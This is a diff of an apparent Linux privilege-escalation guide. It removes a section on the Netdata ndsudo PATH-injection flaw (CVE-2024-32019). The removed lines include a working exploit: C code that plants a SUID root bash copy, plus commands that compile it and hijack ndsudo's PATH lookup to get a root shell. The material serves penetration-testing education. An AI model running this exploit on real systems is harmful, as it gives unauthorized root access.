@@ -903,33 +903,6 @@ If don't mind about doing a lot of noise and `su` and `timeout` binaries are pre
 
 If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.
 
-#### Netdata ndsudo PATH injection (CVE-2024-32019)
-
-Netdata ≤ 1.45.2 ships the helper `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` with `rwsr-x--- root netdata` so the monitoring agent can run privileged hardware probes (`nvme`, `megacli`, `arcconf`). Those probes are resolved **only by scanning the caller’s `$PATH`**, so any user in the `netdata` group can hijack the lookup and execute arbitrary code as root.
-
-1. **Confirm the target** – `id` must show the `netdata` group and `/opt/netdata/bin/netdata -W buildinfo` discloses the vulnerable build (patched in 1.45.3 / 1.45.2-169). Locate the helper with `find / -name ndsudo 2>/dev/null` and enumerate the whitelisted commands using `ndsudo -h` or `ndsudo nvme-list --test` (the latter prints `nvme : not available in PATH.` proving it trusts `$PATH`).
-2. **Provide a fake executable** – Drop a binary named after one of the allowed probes inside a writable directory. The following payload keeps root credentials and deploys a reusable SUID shell:
-
-```c
-#include <unistd.h>
-#include <stdlib.h>
-
-int main(void) {
-    setuid(0); setgid(0);
-    system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
-    return 0;
-}
-```
-
-3. **Exploit the search path** –
-
-```bash
-$ gcc nvme.c -o /dev/shm/nvme && chmod +x /dev/shm/nvme
-$ PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
-$ /tmp/0xdf -p   # root shell
-```
-
-
 ### SUDO and SUID
 
 You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
